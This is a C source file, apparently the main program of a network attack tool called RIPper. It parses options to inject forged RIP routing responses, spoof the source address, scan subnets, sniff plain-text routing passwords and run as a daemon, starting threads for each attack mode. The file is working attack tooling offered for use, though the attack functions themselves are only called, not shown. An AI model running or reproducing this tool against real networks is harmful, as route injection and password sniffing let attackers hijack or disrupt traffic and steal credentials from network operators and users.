#include "fibc.h"
#include "flags.h"

static struct neo_options opt[] = {
  {'-', 0, 0, NULL, "type:"},
  {'a', required_argument, "a/xarbng", "file", "read routes from this file"},
  {'r', required_argument, "r/xarb", "route", "route to inject"},
  {'b', required_argument, "b/xarbng", "subnet", "subnet to scan"},
  {'n', required_argument, "rn/xrnab", "netmask", "netmask of the route"},
  {'g', required_argument, "rg/rxgab", "gateway", "default gateway"},
  {'e', required_argument, "e/exb", "remote", "remote peer"},
  {'m', required_argument, "rm/rmxab", "metric", "metric to the route"},
  {'s', required_argument, NULL, "address", "spoofed source"},
  {'p', required_argument, NULL, "passwd", "password for autentication"},
  {'+', 0, "s|ar", 0, 0},
  {'N', no_argument, NULL, NULL, "ncurses mode"},
  {'x', no_argument, "x/xarbngd", "sniff", "sniff plain text password"},
  {'h', no_argument, NULL, NULL, "print help"},
  {'d', no_argument, "d/dc", NULL, "daemonize"},
  {'c', no_argument, "c/cd", NULL, "check injection"}, 
  {'+', 0, "|Narbx", 0, 0},
  {0, 0, 0, 0, 0}
};

int
main (int argc, char **argv)
{
  unsigned long sp00f = 0;
  char ch;
  pthread_t pt, pt1;

  credits ();
  init_all ();
  if (argc < 2) usage(argv[0]);
  
  neo_getopt (argc, argv, opt, OPT_NOW);
  while ((ch = neo_getopt (argc, argv, opt, OPT_DELAYED)) != EOF)
    {
      switch (ch)
	{
	case 'b':
	  strncpy (n_net, neoptarg, 19);
	  flags ^= SCAN;
	  break;
	case 'x':
	  flags ^= SNIFF;
	  break;
	case 's':
	  sp00f = inet_addr (neoptarg);
	  flags ^= SPOOF;
	  break;
	case 'p':
	  strncpy (password, neoptarg, 16);
	  flags ^= PASS;
	  break;
	case 'e':
	  strncpy(rip_group, neoptarg, 16);
	  break;
	case 'r':
	  routes[0][0] = inet_addr (neoptarg);
	  break;
	case 'm':
	  routes[3][0] = inet_addr (neoptarg);
	  break;
	case 'g':
	  routes[2][0] = inet_addr (neoptarg);
	  break;
	case 'n':
	  routes[1][0] = inet_addr (neoptarg);
	  break;
	case 'a':
	  printf ("Reading file %s...\n\n", neoptarg);
	  rip_file_read (neoptarg);
	  break;
	case 'h':
	  flags ^= N_MODE;
	  //usage (argv[0]);
	  break;
	case 'd':
	  flags ^= DAEMON;
	  break;
	case 'c':
	  flags ^= CHECK;
	  break;
	case 'N':
#ifdef HAVE_LIBNCURSES
	  flags ^= N_MODE;
	  graph=1;
#else
	  graph=0;
	  printf("You have not the ncurses support,if you want it\n");
	  printf("you have to download the library and recompile RIPper\n");
	  return -1
#endif
	    break;
	}
    }
   
  if(flags & N_MODE) return main_graph();	

  if (flags & SCAN)
    {
      n_print ("princ",1,2,"\e[0;31m\tScanner Mode Enabled.\e[0m\n\n");
      scan_net (n_net);
      exit (0);
    }
 
  if (flags & DAEMON)
    {
        n_print ("princ",1,2,"\e[0;31m\tWorking in Daemon Mode.\e[0m\n\n");
	if (fork ())
	exit (0);
    }
  else
    n_print ("princ",1,2,"\tPress 'q' and Enter to exit\n\n");

  if (flags & SPOOF) //nella versione n_menu nn ce ne' bisgono!!
    localaddr = sp00f;
  
  if (flags & PASS)
    {
        if (flags & CHECK) n_print ("princ",1,2,"\e[0;31m\tPacket Injection Encrypted Mode With Checks Entered.\e[0m\n\n");
	if (pthread_create (&pt, NULL, (void *) auth_pass, NULL))
	fatal ("Cannot create pthread!\n\n");
    }
  if (flags & SNIFF)
    {
      n_print ("princ2",1,2,"\e[0;31m\tSniffer Password Mode Enabled.\e[0m\n\n");
      if (pthread_create (&pt, NULL, (void *) sniff_passwd, NULL))
      fatal ("Cannot create pthread!\n\n");
    }
  else
    {
	if (flags & CHECK) n_print ("princ",1,2,"\e[0;31m\tPacket Injection Mode With Checks Entered.\e[0m\n\n");
	else n_print ("princ",1,2,"\e[0;31m\tPacket Injection Mode Entered.\e[0m\n\n");	
	if (pthread_create (&pt, NULL, (void *) send_fake_rip_response, NULL))
	fatal ("Cannot create pthread!\n\n");
    }
  if (flags & CHECK)
    {
      if (flags & PASS)
	{
	  if (pthread_create (&pt1, NULL, (void *) check_injection_crypt, NULL))
	    {
	      fprintf (stderr, "\nerror while creating the pthread\n");
	      pthread_cancel (pt);
	      pthread_join (pt, NULL);
	      exit (1);
	    }
	}
      else
	{
	  if (pthread_create (&pt1, NULL, (void *) check_injection, NULL))
	    {
	      fprintf (stderr, "\nerror while creating the pthread\n");
	      pthread_cancel (pt);
	      pthread_join (pt, NULL);
	      exit (1);
	    }
	}
    }
  while ((char) getchar () != 'q');

  fprintf (stderr, "\nExiting...\n");
  pthread_cancel (pt);
  pthread_join (pt, NULL);
  if (flags & CHECK)
    {
      pthread_cancel (pt1);
      pthread_join (pt1, NULL);
    }

  return 0;
}
